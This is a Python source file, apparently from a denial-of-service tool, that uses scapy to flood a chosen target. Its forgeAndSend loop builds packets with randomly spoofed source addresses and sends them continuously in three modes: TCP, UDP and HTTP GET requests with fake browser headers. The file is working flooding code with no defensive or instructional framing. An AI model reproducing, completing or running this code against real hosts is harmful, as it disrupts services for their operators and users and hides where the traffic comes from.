from scapy.all import *
from . import ipGen
from .socks import Log
import time 

class Attack :
    target = None 
    port = None
    aType = None 
    running = False

    def __init__(self,target,port,aType) :
        self.target = target 
        self.port = port 
        self.aType = aType

    def __repr__(self) :
        return f'Attack(target={self.target},port={self.port},type={self.aType})'

def forgeAndSend(attack) :
    forgedPacket = None
    while attack.running :
        if attack.aType == '0' : 
            forgedPacket = IP(src=ipGen(),dst=attack.target)/TCP(sport = random.randint(1,65535), dport = attack.port)/" "*100
        elif attack.aType == '1' :
            forgedPacket = IP(src=ipGen(),dst=attack.target)/UDP(sport = random.randint(1,65535), dport = attack.port)/" "*100
        elif attack.aType == '2' :
            headers = [
                "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
                "Accept-Language: en-us,en;q=0.5",
                ''
            ]
            message = 'GET /?' + f"{random.randint(0, 2000)} HTTP/1.1\r\n"
            message += '\r\n'.join(headers)

            forgedPacket = IP(src=ipGen(),dst=attack.target)/TCP(sport = random.randint(1,65535), dport = attack.port)/message
        # print(Log(f'Sending {forgedPacket}'))
        send(forgedPacket,inter=0.001,verbose=False)
    return